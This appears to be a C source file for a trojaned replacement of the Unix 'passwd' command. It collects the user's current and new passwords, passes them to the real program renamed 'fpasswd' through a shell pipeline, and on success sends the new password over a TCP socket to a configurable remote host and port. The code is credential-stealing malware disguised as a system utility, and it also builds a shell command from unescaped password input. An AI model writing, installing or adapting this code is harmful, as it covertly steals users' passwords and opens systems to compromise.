#include <stdlib.h>	//to use system()
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#define PORT 8080

#define REMOTE_HOST "127.0.0.1"
#define REMOTE_PORT 8080 

#define MAX 512

/*
 * buf: the buffer potentially with the substring inside
 * substring: the substring to check for
 *
 * return: the index of the substring
 */
int indexOf(char *buf, char *s) {
  char str[MAX];
  char substr[MAX];
  snprintf(str, MAX, "%s", buf);
  snprintf(substr, MAX, "%s", s);

  for (int i = 0; i < strlen(str); i++) {
    // check if the first letter matches the substring
    if (str[i] != substr[0]) {
      continue;
    } else {
      int j;
      for (j = i; j < (strlen(substr) + i); j++) {
        if (str[j] != substr[j - i]) {
          break;
        }
      }
      if (j == (strlen(substr) + i)) {
        return i;
      }
    }
  }
}

/*
 * src and dest needs to have length MAX
 */
int substring(char *src, int startIdx, int endIdx, char *dest) {
  if (startIdx < 0 || startIdx > MAX || endIdx < 0 || endIdx > MAX) {
    return -1;
  } else {
    for (int i = startIdx; i < endIdx; i++) {
      dest[i - startIdx] = src[i];
    }
  }
}


int main()
{ 
  char *currentPwd;
  char *newPwd;
  char *retypePwd;

  char currentPwdBuf[MAX];
  char newPwdBuf[MAX];
  char retypePwdBuf[MAX];
  char buf[MAX];
  char username[MAX];
  char passwdMessage[MAX];
  char badMessage[MAX];
  char sorryMessage[MAX];

  getlogin_r(username, MAX);
  printf("Changing password for %s.\n", username);

  currentPwd = getpass("Current password: ");
  snprintf(currentPwdBuf, MAX, "%s", currentPwd);
  newPwd = getpass("New password: ");
  snprintf(newPwdBuf, MAX, "%s", newPwd);
  retypePwd = getpass("Retype new password: ");
  snprintf(retypePwdBuf, MAX, "%s", retypePwd);

  // construct the command to execute actual password changing program
  // fpasswd is the actual passwd
  snprintf(buf, MAX, "(printf \"%s\n%s\n%s\n\" | fpasswd 2>&1)", currentPwdBuf, newPwdBuf, retypePwdBuf);

  // using popen to get the output of the command
  FILE *cmdOut = popen(buf, "r");
  // print out important output from command
  while (fgets(buf, MAX, cmdOut) != NULL) {
    substring(buf, indexOf(buf, "Sorry, "), MAX - 1, sorryMessage);
    printf("%s", sorryMessage);
    substring(buf, indexOf(buf, "Bad: "), MAX - 1, badMessage);
    printf("%s", badMessage);
    substring(buf, indexOf(buf, "passwd: "), MAX - 1, passwdMessage);
    printf("%s", passwdMessage);
  }

  // check the exit status of password changing process
  if (WEXITSTATUS(pclose(cmdOut)) == 0) {
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
      return 0;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, REMOTE_HOST, &serv_addr.sin_addr)<=0) {
      return 0;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
      return 0;
    }

    // printf("%s\n", newPwdBuf);

    send(sock , newPwdBuf, MAX, 0);
    return 0;
  }

  return 0;
}

